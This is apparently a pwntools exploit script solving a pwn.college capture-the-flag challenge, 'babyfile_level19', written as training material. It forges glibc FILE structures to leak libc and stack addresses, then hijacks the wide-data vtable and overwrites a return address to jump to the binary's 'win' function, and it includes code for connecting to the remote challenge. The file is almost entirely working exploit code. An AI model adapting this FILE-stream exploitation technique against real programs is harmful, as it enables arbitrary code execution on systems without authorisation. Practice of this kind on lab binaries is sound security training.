from pwn import *
from time import sleep
context.binary=e=ELF("./babyfile_level19")
libc=e.libc
gs="""
set listsize 50
set $glibc_src_dir="../../glibc-2.31/"
source ~/add_src.py
#b fwrite  if ( $rdi != stdout )
#b fread if ($rdi != stdin)
#b _IO_new_file_overflow if ( $rdi != stdout )
#b _IO_file_read if ( $rdi != stdin )
b _IO_new_file_underflow if ( $rdi != stdin)
b *challenge+1458
b _IO_wfile_xsputn
b _IO_wdefault_xsputn
b _IO_wfile_overflow
b _IO_wdoallocbuf
"""
_IO_EOF_SEEN=0x0010
_IO_NO_READS=0x0004
_IO_CURRENTLY_PUTTING=0x0800
_IO_IS_APPENDING=0x1000
_IO_IN_BACKUP=0x0100
_IO_FLAGS2_NOTCANCEL=2
_IO_MAGIC=0xFBAD0000 
_IO_MAGIC_MASK=0xFFFF0000
if args.LOCAL:
    p=e.process()
    if args.GDB:
        gdb.attach(p,gdbscript=gs)
        pause()
elif args.REMOTE:
    s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key",ignore_config=True)
    p=s.process("/challenge/babyfile_level19")
def new_note(which_: int,size: int):
    p.sendlineafter(b"[*] Commands: ",b"new_note")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.sendlineafter(b"How many bytes to the note?",str(size).encode())
def write_note(which_: int,data: bytes):
    p.sendlineafter(b"[*] Commands: ",b"write_note")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.sendline(data)
def del_note(which_: int):
    p.sendlineafter(b"[*] Commands: ",b"del_note")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.recvuntil(f"free(notes[{which_}]);\n".encode())
def read_file(which_: int):
    p.sendlineafter(b"[*] Commands: ",b"read_file")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.recvuntil(f'fread(notes[{which_}], 1,'.encode())
    p.recvuntil(b'fp);\n')
def write_file(which_: int):
    p.sendlineafter(b"[*] Commands: ",b"write_file")
    p.sendlineafter(b"Which note? (0-10)",str(which_).encode())
    p.recvuntil(f'fwrite(notes[{which_}], 1,'.encode())
    p.recvuntil(b'fp);\n')   

new_note(0,0x600)
new_note(1,0x18)
new_note(2,0x200)
new_note(3,0x18)
del_note(0)
new_note(0,0x600)

p.sendlineafter(b"[*] Commands: ",b"open_file")
p.recvuntil(b"""fp = fopen("/tmp/babyfile.txt", "w") = 0x""")
fp=int(p.recvuntil(b"\n").rstrip().decode(),16)
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(0)+ #_flags
            p64(0)+p64(0)+p64(0)+ # read_ptr,read_end,read_base
            p64(0)+p64(0)+p64(0)+ # write_base,write_ptr,write_end
            p64(0)+p64(0)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(1)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)#+p64(e.sym.secret-8)+ # _lock
            #b"\0"*(160-136-8)+p64(0)+ # _wide_data
            #b"\0"*(216-160-8)
            )
write_file(0)
libc.address=int(p.recv(8)[::-1].hex(),16)-(libc.sym.main_arena+96)
log.info(f"libc @ {hex(libc.address)}")
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64( _IO_IS_APPENDING |  _IO_CURRENTLY_PUTTING)+ #_flags
            p64(0)+p64(0)+p64(0)+ # read_ptr,read_end,read_base
            p64(libc.sym.environ)+p64(libc.sym.environ+7)+p64(libc.sym.environ+8)+ # write_base,write_ptr,write_end
            p64(0)+p64(0)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(1)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)#+p64(e.sym.secret-8)+ # _lock
            #b"\0"*(160-136-8)+p64(0)+ # _wide_data
            #b"\0"*(216-160-8)
            )
write_file(0)
leak_stack=int(p.recv(6)[::-1].hex(),16)
log.info(f"leak_stack @ {hex(leak_stack)}")
ret_addr=leak_stack-0x130
read_ret_addr=leak_stack-0x3e0
pause()
p.sendlineafter(b"[*] Commands: ",b"write_fp")
p.sendafter(b" {0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0:0}\n",
            p64(0)+ #_flags
            p64(ret_addr-7)+p64(ret_addr-7)+p64(0)+ # read_ptr,read_end,read_base
            p64(0x0)+p64(0x0)+p64(0x1)+ # write_base,write_ptr,write_end
            p64(read_ret_addr)+p64(read_ret_addr+0x40)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(112-8-8*3*3)+p32(0)+p32(0)+ # fileno, flags2
            b"\0"*(136-112-8)+p64(fp-0x20)+ # _lock
            b"\0"*(160-136-8)+p64(fp+224)+ # _wide_data
            b"\0"*(216-160-8)+p64(libc.sym._IO_wfile_jumps_mmap)+
            p64(0)+p64(0)+p64(0)+ # read_ptr,read_end,read_base
            p64(0)+p64(0)+p64(0)+ # write_base,write_ptr,write_end
            p64(0)+p64(0)+p64(0)+ # buf_base,buf_end,save_base
            b"\0"*(224-8*3*3)+p64(libc.sym._IO_file_jumps-0x48)
            )
write_file(0)
p.sendline(p64(e.sym.win))
p.interactive()
